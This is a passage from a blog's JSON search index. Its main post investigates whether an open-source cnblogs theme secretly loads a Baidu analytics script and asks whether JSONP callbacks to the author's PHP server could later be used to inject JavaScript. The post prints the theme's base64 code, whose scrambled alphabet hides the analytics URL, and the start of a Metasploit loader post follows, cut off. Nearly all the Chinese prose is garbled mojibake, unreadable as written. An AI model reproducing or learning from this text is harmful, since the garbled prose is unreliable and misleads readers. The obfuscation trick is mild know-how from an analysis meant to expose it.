\u0026#34;https://home.cnblogs.com/u/\u0026#34; + blogConst.blogAcc + \u0026#34;/relation/followers/\u0026#34;; if (page \u0026amp;\u0026amp; page \u0026gt; 1) { url += \u0026#34;?page=\u0026#34; + page; } return forwardXmlJsonp(url, parseFollowers); }, è¿™ä¸‰ä¸ªæ¥å£æ˜¯èµ°çš„phpåç«¯çš„apiï¼Œç†ç”±æ˜¯èƒ½è‡ªæ´½çš„ï¼Œå› ä¸ºæ¶‰åŠåˆ°ä¸åŒå­åŸŸäº†ï¼Œå­˜åœ¨è·¨ç«™è¯·æ±‚ï¼Œæ‰€ä»¥éœ€è¦ç¬¬ä¸‰æ–¹åç«¯æ¥è¿›è¡Œå¤„ç†\nä¸è¿‡ç™¾åº¦ç»Ÿè®¡æˆ‘è¿˜æ˜¯ä¸å¤ªèƒ½ç†è§£\n2020/05/12 22:14\né¦–å…ˆè¯´å¥½æœ¬æ–‡åªæ˜¯æˆ‘ä¸ªäººçš„çŒœæµ‹ï¼Œå¦‚æœæœ‰ä¸å¯¹çš„åœ°æ–¹è¯·åŠæ—¶æŒ‡æ­£\nèƒŒæ™¯ å‰äº›å¤©æœ‹å‹ä»‹ç»ï¼Œçœ‹åˆ°ä¸€ä¸ªåšå®¢å›­ä¸»é¢˜ï¼Œä¸»é¢˜çš„æ€è·¯å¾ˆæ£’ï¼Œå…·ä½“æ€ä¹ˆæ£’ä¸è¡¨ï¼Œåªæ˜¯åæ¥çœ‹äº†çœ‹æºç ï¼Œå‘ç°äº†ä¸€äº›ç§˜å¯†çš„ä¸œè¥¿ã€‚\næºç åœ°å€https://github.com/cjunn/cnblog_theme_atum\nå‘ç° ç¥ç§˜çš„åç«¯è¯·æ±‚ é¦–å…ˆæ˜¯è¿™ä¸ªä¸»é¢˜ä¼šå‘ä¸»é¢˜ä½œè€…çš„phpæœåŠ¡å™¨å‘é€è¯·æ±‚\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯è¿”å›ä¸€ä¸ªcallbackï¼Œè¿™ä¸€èˆ¬æ˜¯è§£å†³è·¨åŸŸæ‰€é‡‡ç”¨çš„jsonpæŠ€æœ¯\né‚£ä¹ˆjsonpçš„å…·ä½“åŸç†æ˜¯å•¥ï¼Ÿ\njsonpåŸç† å› ä¸ºæµè§ˆå™¨è·¨åŸŸæœºåˆ¶çš„å­˜åœ¨ï¼Œå¦‚æœåœ¨å¯¹æ–¹æ¥å£æœåŠ¡å™¨ä¸Šé¢å¹¶æ²¡æœ‰åšcorsç›¸å…³çš„æ“ä½œï¼Œé‚£ä¹ˆæ˜¯è¯·æ±‚ä¸åˆ°ajaxæ¥å£æ•°æ®çš„ï¼ŒjsonpæŠ€æœ¯åº”è¿è€Œç”Ÿ\næµè§ˆå™¨æ˜¯å¯ä»¥å¼•å…¥å¤–åŸŸçš„jsçš„ï¼Œå¹¶ä¸”å¤–åŸŸä¸Šä¸éœ€è¦åšä»»ä½•è·¨åŸŸç›¸å…³çš„è®¾ç½®ï¼Œå¼•å…¥å¤–åŸŸjsåå°±å¯ä»¥è°ƒç”¨è¯¥jsé‡Œé¢çš„å‡½æ•°ï¼Œæ‰€ä»¥åœ¨æ¥å£ä¸Šä¼ é€’ä¸€ä¸ªcallbackï¼Œæ¯”å¦‚\n1 \u0026lt;script src=\u0026#34;http://a.com/a.php?callback=ttt\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; ç„¶åé‚£è¾¹è¿”å›ä¸€ä¸ªjsï¼Œjsçš„å†…å®¹ä¸º\n1 ttt({\u0026#39;a\u0026#39;: 1, \u0026#39;b\u0026#39;: 2}) é‚£ä¹ˆè°ƒç”¨tttå‡½æ•°å³å¯è·å¾—è¿™ä¸ªjsonæ•°æ®\nåç«¯è¯·æ±‚é—®é¢˜ç‚¹ æ˜¯ä¸æ˜¯åˆ°ç°åœ¨ä¸ºæ­¢ä½ è¿˜æ˜¯è§‰å¾—ï¼Œå¥½åƒæ²¡ä»€ä¹ˆé—®é¢˜å•Šï¼Œä»–è¿”å›ä¸€ä¸‹å¥½åƒä¹Ÿæ²¡é—®é¢˜å•Šï¼Ÿ\nä½†æ˜¯è¯•æƒ³ä¸€ä¸ªï¼Œè¿™ä¸ªcallbackä»–æ˜¯å¯ä»¥åœ¨åç«¯ä»»æ„æ›¿æ¢çš„ï¼Œæ¯”å¦‚ç»™ä½ åŠ ä¸ªjsè·å–ä½ çš„ä¸€äº›ä¿¡æ¯ï¼Œç”šè‡³è¿˜å¯ä»¥æ§åˆ¶ä½ çš„æµè§ˆå™¨ä¸€äº›è¡Œä¸ºï¼Œæ¯”å¦‚å¸®ä»–ç‚¹å‡»ä¸€ä¸ªå•¥å•¥å•¥ï¼Œå¯ä»¥äº†è§£ä¸€ä¸‹Beef\nç¥ç§˜çš„åŠ å¯†å­—ç¬¦ä¸² æˆ‘çœ‹äº†è¿™ä¸ªä¸»é¢˜å ç”¨cpuå’Œå†…å­˜æ¯”è¾ƒä½ï¼Œæ‰€ä»¥èŠ±äº†å‡ åˆ†é’Ÿæ—¶é—´ç¿»äº†ä¸‹æºç ï¼Œå‘ç°äº†ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿\næˆ‘åœ¨æ‰¾ä¸Šé¢æ‰€è¯´çš„phpè¯·æ±‚çš„æ—¶å€™å‘ç°äº†è¿™ä¸ª\nç„¶åè·Ÿè¿›å»\nç»§ç»­è·Ÿ\næœ‰ä¸€ä¸²åŠ å¯†çš„ä¸œè¥¿\nçœ‹åç§°åƒæ˜¯ç™¾åº¦ç»Ÿè®¡ï¼Œä½†æ˜¯ä½ ä¸ºä»€ä¹ˆåŠ ä¸ªå¯†ï¼Œè·Ÿè¿›è¿™ä¸ªåŠ å¯†å‡½æ•°çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 /** * * Base64 encode / decode * http://www.webtoolkit.info * **/ // private property let _keyStr = \u0026#34;\u0026#34; _keyStr += \u0026#34;AByz0r4wxs\u0026#34;; // public method for encoding let encode = function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; input = _utf8_encode(input); while (i \u0026lt; input.length) { chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 \u0026gt;\u0026gt; 2; enc2 = ((chr1 \u0026amp; 3) \u0026lt;\u0026lt; 4) | (chr2 \u0026gt;\u0026gt; 4); enc3 = ((chr2 \u0026amp; 15) \u0026lt;\u0026lt; 2) | (chr3 \u0026gt;\u0026gt; 6); enc4 = chr3 \u0026amp; 63; if (isNaN(chr2)) { enc3 = enc4 = 64; } else if (isNaN(chr3)) { enc4 = 64; } output = output + _keyStr.charAt(enc1) + _keyStr.charAt(enc2) + _keyStr.charAt(enc3) + _keyStr.charAt(enc4); } // Whend return output; } // End Function encode _keyStr += \u0026#34;KLMCDEtuTUVWX12NOPQk\u0026#34;; // public method for decoding let decode = function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \u0026#34;\u0026#34;); while (i \u0026lt; input.length) { enc1 = _keyStr.indexOf(input.charAt(i++)); enc2 = _keyStr.indexOf(input.charAt(i++)); enc3 = _keyStr.indexOf(input.charAt(i++)); enc4 = _keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 \u0026lt;\u0026lt; 2) | (enc2 \u0026gt;\u0026gt; 4); chr2 = ((enc2 \u0026amp; 15) \u0026lt;\u0026lt; 4) | (enc3 \u0026gt;\u0026gt; 2); chr3 = ((enc3 \u0026amp; 3) \u0026lt;\u0026lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) { output = output + String.fromCharCode(chr2); } if (enc4 != 64) { output = output + String.fromCharCode(chr3); } } // Whend output = _utf8_decode(output); return output; } // End Function decode _keyStr += \u0026#34;lmnopqYZabcdef\u0026#34;; // private method for UTF-8 encoding let _utf8_encode = function (string) { var utftext = \u0026#34;\u0026#34;; string = string.replace(/\\r\\n/g, \u0026#34;\\n\u0026#34;); for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if ((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } // Next n return utftext; } // End Function _utf8_encode _keyStr += \u0026#34;35RSJFGHIvgh\u0026#34;; // private method for UTF-8 decoding let _utf8_decode = function (utftext) { var string = \u0026#34;\u0026#34;; var i = 0; var c, c1, c2, c3; c = c1 = c2 = 0; while (i \u0026lt; utftext.length) { c = utftext.charCodeAt(i); if (c \u0026lt; 128) { string += String.fromCharCode(c); i++; } else if ((c \u0026gt; 191) \u0026amp;\u0026amp; (c \u0026lt; 224)) { c2 = utftext.charCodeAt(i + 1); string += String.fromCharCode(((c \u0026amp; 31) \u0026lt;\u0026lt; 6) | (c2 \u0026amp; 63)); i += 2; } else { c2 = utftext.charCodeAt(i + 1); c3 = utftext.charCodeAt(i + 2); string += String.fromCharCode(((c \u0026amp; 15) \u0026lt;\u0026lt; 12) | ((c2 \u0026amp; 63) \u0026lt;\u0026lt; 6) | (c3 \u0026amp; 63)); i += 3; } } // Whend return string; } // End Function _utf8_decode _keyStr += \u0026#34;ij6789+/=\u0026#34;; export default { i: (message) =\u0026gt; { return encode(message); }, o: (ciphertext) =\u0026gt; { return decode(ciphertext); }, } è¿™ä¸ªå‡½æ•°è‡ªå·±è·‘ä¸€ä¸‹ï¼Œè·‘å‡ºæ¥æ˜¯ https://hm.baidu.com/hm.js?ae80cc662109a34c868ba6cbe3431c8d è¿™ä¸ªç™¾åº¦ç»Ÿè®¡åœ°å€\nç„¶ååœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯ä½ æ¯æ¬¡è¿›ç½‘ç«™çš„æ—¶å€™\næ¯æ¬¡è¿›ç½‘ç«™è°ƒç”¨è¿™ä¸ªå‡½æ•° initBaiduCount()\nå¹¶ä¸”åŠ äº†ä¸ªè·¯ç”±å®ˆå«è°ƒç”¨ pushBaiduCount()\nå¯èƒ½æœ‰çš„äººä¸ç†è§£è·¯ç”±å®ˆå«æ˜¯ä»€ä¹ˆï¼Œè·¯ç”±å®ˆå«å°±æ˜¯ä¸€ä¸ªhooké’©å­ï¼Œåœ¨ä½ æ¯æ¬¡è¿›å…¥æˆ–ç¦»å¼€è·¯ç”±ï¼Œæˆ–è€…è¯´è¯¥ç½‘ç«™çš„é¡µé¢æ—¶è°ƒç”¨ï¼Œæ¯”å¦‚è¿™é‡Œæ˜¯è¿›å…¥ä¸€ä¸ªæ–°è·¯ç”±çš„æ—¶å€™å°±è°ƒç”¨ä¸€ä¸‹ï¼Œè·Ÿè¿›å»çœ‹çœ‹\nè¿™é‡Œæ˜¯æ’å…¥äº†ç™¾åº¦ç»Ÿè®¡ä»£ç \næˆ‘çš„ç–‘æƒ‘ç‚¹ æˆ‘ä¸å¤ªæ‡‚ç™¾åº¦ç»Ÿè®¡æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä¸€ç›´è®¤ä¸ºå°±æ˜¯ä¸€ä¸ªç®¡ç«™ç‚¹æµé‡å’Œè®¿é—®é‡çš„ï¼Œä¹Ÿä¸çŸ¥é“æœ‰å•¥å…¶ä»–ä¸œè¥¿\næˆ‘è¯´ä¸‹æˆ‘è§‰å¾—å¯ç–‘çš„ç‚¹\næˆ‘å§‘ä¸”è®¤ä¸ºæ˜¯ä¸ºäº†ç»™è‡ªå·±çš„åšå®¢è¿›è¡Œç»Ÿè®¡ï¼Œä½†æ˜¯è¿™å…¶ä¸­ä¸ºä»€ä¹ˆå¤§è´¹å‘¨ç« å»åŠ å¯†è§£å¯†ï¼Œè¿™ä¸ªæˆ‘ä¸å¤ªç†è§£\nè¿˜æœ‰çš„æ˜¯è¿™ä¸ªåŠ å¯†çš„jså»æ‰äº†åç¼€jsï¼Œè¿™æ ·githubå°±æ²¡æ³•æ£€ç´¢åˆ†æä»£ç äº†ï¼Œä¸æŠŠä»£ç downä¸‹æ¥åº”è¯¥æ˜¯åªèƒ½ç¡¬æ‰¾\næˆ‘çœ‹äº†ä¸‹ï¼Œå…¶å®å¹¶æ²¡æœ‰ç”¨åˆ°è‡ªå»ºphpæœåŠ¡å™¨ä¸Šçš„ä¸œè¥¿ï¼Œæœ€å¼€å§‹ä»¥ä¸ºæ˜¯åä»£åšå®¢å›­è½¬åŒ–ä¸ºæ¥å£ï¼Œä½†æ˜¯æˆ‘çœ‹äº†ä¸‹è¯·æ±‚ï¼Œå…¨éƒ½æ˜¯åªæœ‰callbackï¼Œè¿”å›çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘å®åœ¨æƒ³ä¸åˆ°æ˜¯æœ‰ä»€ä¹ˆå¿…è¦è¿›è¡Œè¿™ä¸ªæ“ä½œï¼Œç›®å‰çœ‹èµ·æ¥æ˜¯æ²¡æœ‰ä»·å€¼çš„\næ‰€ä»¥é—®é¢˜æ¥äº†ï¼š\næ·»åŠ äº†ç™¾åº¦ç»Ÿè®¡ï¼Œä½†æ˜¯å¤§è´¹å‘¨ç« åŠ è§£å¯†ï¼Œçœ‹èµ·æ¥å¹¶ä¸æ˜¯è®©ç”¨æˆ·å¯è‡ªå®šä¹‰çš„é¡¹æˆ–è€…ä¸æ˜¯å¤§å¤§æ–¹æ–¹ç»™äººçœ‹çš„ä¸œè¥¿ï¼Ÿ è¿™ä¸ªphpæœåŠ¡å™¨ä¸»è¦ç”¨å¤„æ˜¯ä»€ä¹ˆï¼Ÿç›®å‰çš„callbackçœ‹èµ·æ¥æ˜¯æ¯«æ— æ„ä¹‰çš„ï¼Œè¿˜æ˜¯çœŸåƒæˆ‘æ‰€æƒ³çš„ï¼Œæ–¹ä¾¿ä»¥ååšä¸€äº›äº‹æƒ…ï¼Ÿ ","permalink":"https://www.hacktech.cn/post/open-source-theme-cnblogs-bad-or-not.html","summary":"\u003cp\u003e2020/05/13 14:50æ›´æ–°\u003c/p\u003e\n\u003cp\u003eåœ¨è¯„è®ºçš„é©±ä½¿ä¸‹æˆ‘ä»”ç»†å»çœ‹äº†ä¸‹ï¼Œæœ‰å‡ å¤„ç¡®å®ç”¨åˆ°äº†åç«¯æ¥å£\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eloadBlogTalk\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eforwardXmlJsonp\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://ing.cnblogs.com/u/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eblogConst\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eblogAcc\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eparseTalkList\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  },\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eloadBlogSearch\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ekeyword\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eforwardXmlJsonp\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://zzk.cnblogs.com/s/blogpost?w=\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e encodeURI(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;blog:\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eblogConst\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eblogAcc\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ekeyword\u003c/span\u003e), \u003cspan style=\"color:#a6e22e\"\u003eparseSearchKeyWord\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  },\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e7\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eloadFollowers\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://home.cnblogs.com/u/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eblogConst\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eblogAcc\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/relation/followers/\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;?page=\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eforwardXmlJsonp\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eparseFollowers\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  },\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eè¿™ä¸‰ä¸ªæ¥å£æ˜¯èµ°çš„phpåç«¯çš„apiï¼Œç†ç”±æ˜¯èƒ½è‡ªæ´½çš„ï¼Œå› ä¸ºæ¶‰åŠåˆ°ä¸åŒå­åŸŸäº†ï¼Œå­˜åœ¨è·¨ç«™è¯·æ±‚ï¼Œæ‰€ä»¥éœ€è¦ç¬¬ä¸‰æ–¹åç«¯æ¥è¿›è¡Œå¤„ç†\u003c/p\u003e","title":"åšå®¢å›­æŸå¼€æºä¸»é¢˜æš—è—ç§è´§ï¼Ÿ"},{"content":"æœ¬ç¯‡æ–‡ç« ä¸»è¦è®¨è®ºä¸€ä¸‹msfå®˜æ–¹æ–‡æ¡£ä¸­æåˆ°çš„sockediè°ƒç”¨çº¦å®šåˆ°åº•æ˜¯æŒ‡ä»€ä¹ˆ?\nèƒŒæ™¯ æœ€è¿‘åœ¨åšä¸€äº›msfç›¸å…³çš„äº‹æƒ…ï¼Œä»Šå¤©å¬åˆ°å…æ€ç›¸å…³çš„ï¼Œå»æŸ¥è¯¢äº†ä¸‹ç›¸å…³èµ„æ–™ã€‚\nç¬¬ä¸€ä¸ªä¸èƒ½é”™è¿‡çš„å°±æ˜¯cobalt strikeä½œè€…æ—©å¹´å†™çš„metasploit-loaderé¡¹ç›®äº†ï¼Œæˆ‘çœ‹äº†é¡¹ç›®æºç ï¼Œæ‰¾äº†ä¸€äº›ç›¸å…³èµ„æ–™\nåœ¨ Meterpreterè½½è·æ‰§è¡ŒåŸç†åˆ†æ æ–‡ç« å‘ç°äº†ä¸€äº›ç»†èŠ‚æ€§çš„ä¸œè¥¿ï¼Œä¹Ÿæ„Ÿè°¢è¯¥æ–‡ä½œè€…çš„æŠ›ç –å¼•ç‰ï¼Œä¸è¿‡æ–‡ä¸­æœ‰ä¸€äº›é”™è¯¯ä»¥åŠæœªè¯´æ˜ç™½çš„åœ°æ–¹ï¼Œæˆ‘ä¼šä¸€ä¸€é“æ¥ã€‚\næ³¨æ„ï¼šæœ¬æ–‡åªæ˜¯å¯¹æˆ‘è‡ªå·±çš„åˆ†æç»“æœè¿›è¡Œä¸€æ¬¡å¤ç›˜ï¼Œå¦‚æœæœ‰ä»€ä¹ˆé”™è¯¯ä¹‹å¤„æ¬¢è¿å¤§å®¶æ–§æ­£\nmetasploit loader metasploitçš„shellcodeåˆ°åº•åšäº†ä»€ä¹ˆ é¦–å…ˆæˆ‘ä»¬éœ€è¦æ¢è®¨çš„ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯metasploitçš„shellcodeåˆ°åº•åšäº†ä»€ä¹ˆï¼Ÿ\nåœ¨msfçš„å®˜æ–¹wikiä¸­ï¼Œå®˜æ–¹æœ‰å¯¹è¿™ä¸ªé—®é¢˜åšä¸€äº›ç®€å•çš„è§£é‡Š\nHow payloads work ä¸­æ–‡ç¿»è¯‘ç‰ˆåœ¨è¿™ ä»ä¸Šé¢çš„æ–‡ç« 